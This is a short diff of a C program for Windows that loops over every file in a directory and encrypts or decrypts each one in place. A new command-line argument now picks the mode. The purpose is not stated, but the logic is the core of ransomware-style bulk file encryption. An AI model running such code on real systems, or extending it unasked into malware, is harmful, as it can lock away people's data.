@@ -1,10 +1,9 @@
 #include "crypt_lib.c"
 
-int encrypt(char *filename);
-int decrypt(char *filename);
-char *concat(const char *dest, const char *src);
+int encrypt_file(char *filename);
+int decrypt_file(char *filename);
 
-int main(void) {
+int main(int argc, char *argv[]) {
 	HANDLE fileHandle;
 	WIN32_FIND_DATA ffd;
 	LARGE_INTEGER szDir;
@@ -23,11 +22,10 @@ int main(void) {
 		printf("Invalid File Handle Value\n");
 	do {
 		retval = GetFullPathNameA(ffd.cFileName, BUFSIZE, path, lppPart);
-		/* DETERMINE HERE IF ENCRYPTING OR DECRYPTING
-		encrypt(path);	
-		decrypt(path);
-		*/
-		decrypt(path);
+		if (argc > 1)
+			encrypt_file(path);
+		else
+			decrypt_file(path);
 	} while (FindNextFile(fileHandle, &ffd) != 0);
 	return 0;
 }
